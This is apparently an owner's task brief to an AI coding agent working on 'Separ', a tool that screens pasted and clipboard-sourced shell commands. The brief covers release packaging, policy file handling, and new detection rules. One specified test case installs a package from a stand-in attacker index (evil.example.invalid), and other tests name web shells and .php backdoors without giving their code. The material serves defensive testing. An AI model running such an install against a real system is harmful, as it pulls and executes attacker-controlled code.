# Separ — round 2 (owner decisions, 23 Nov 2026)

Continue on branch `fix/review-2026-11`, same rules as before (CLAUDE.md, small commits with tests,
nothing pushed). Do Part A first and stop for my review before Part B.

## Part A — finish v2.4 (no decision changes)

1. `pyproject.toml`: add `extend-exclude = ["documentation"]` to `[tool.ruff]` so `ruff check .` passes.
   The paper and its scripts are handled separately later.
2. `scripts/check_publishable.py` and `tests/test_reproduce.py`: allow the badge and repository hosts
   (`img.shields.io`, `github.com/parsabe`) explicitly, with a test; do not weaken any other check.
3. Review-list R2, owner decision: a per-user daemon uses `/etc/separ/policy.yaml` and `/etc/separ/admin.pub`
   when they exist, and then requires them to be root-owned and not writable by group/others. Only when
   they do not exist does it fall back to `~/.config/separ/`, still reported as "degraded protection".
   Tests for both paths.
4. CI: add a release job that, on a tag `v*`, builds the `.deb` (amd64) and `.rpm` (x86_64), runs the
   container install checks (ubuntu:24.04, debian:13, rockylinux:9), and attaches both packages to a GitHub
   Release. Update README install instructions to download from Releases.
5. Run the full check set, update docs/progress.md, stop.

## Part B — v2.5 (decision changes)

Before any code: draw and record a NEW variant seed in docs/variant-seeds.md
(`secrets.randbelow(900_000_000) + 100_000_000`), commit it. Seed 335384967 was already used to
measure the flags, so it must not be used to evaluate v2.5. Weights stay unchanged.

Owner decisions:
1. **Approve A80, A81, A82**: make their flags default on. Restore known gap G4 in
   `tests/variants/known_gaps.yaml`.
2. **A83 — how the clipboard was written** (new design decision, approved):
   - Browser `clipboard_write` with `input_method = user_selection` (the user selected and copied the text):
     the decision is capped at HOLD; the endpoint prompt names the page domain the text was copied from and
     what the command would do ("downloads from X and runs it"), options stop/continue.
   - `input_method = page_script` (the page wrote the clipboard): unchanged, may BLOCK.
   - New policy section `trusted_copy_sources`: page domains whose copied commands are treated like typed
     commands (origin none). Empty by default. `policy.yaml.example` lists only curated documentation hosts
     (e.g. `rustup.rs`, `docs.docker.com`) with a comment that hosts where anyone can publish
     (github.com, gitlab.com, pastebin, …) must never be listed. Validation warns on those hosts.
   - Overrides (canary, protected asset, self-tamper) still come first.
   - Write the design decision text with its known weakness: an attacker can instruct the user to select
     and copy the text themselves.
3. **F15 — truthful `new_file` in the web root, persistence extended**: report `new_file` truthfully, and
   define persistence (C7) as a new **or modified** executable file in a web root. Record as an A-number.
   Tests: new web shell, backdoor appended to an existing `.php`, benign edit of a non-executable file.
4. **F16 — implied network use of common tools**: in intent.py, give tools without a visible host their
   default destination: `pip install` (no `--index-url`/`--extra-index-url`) → `package_index`;
   `pip install --index-url URL` → that host; `npm install` → `npm_registry`; `docker run|pull` →
   `container_registry` (or the registry named in the image); `ssh|scp|sftp user@host` → that host;
   `git pull|fetch` without URL → `unknown_vcs_remote`. Add `npm_registry` and `container_registry`
   destination classes to the default policy (trusted only where the default policy already trusts the
   package index). Tests: default `pip install requests` stays allowed typed and pasted-by-selection;
   `pip install --index-url https://evil.example.invalid/simple x` is flagged.
5. **F17**: the daemon runs the full PID sweep once in a background thread 5 minutes after start, at
   low priority (`os.nice(10)` in that thread's process or a sleep between chunks), without blocking the API.

Then: evaluate v2.4 vs v2.5 on the new seed (all benign variants included), re-run the Attack Lab honest
controls (10 pasted via guard, the same 10 via the browser path with user_selection and with page_script,
8 typed) and report them as tables in docs/v2.5-evaluation.md. Bump to 2.5.0, tag `v2.5` locally,
update docs/progress.md and docs/review-list.md. Do not push.
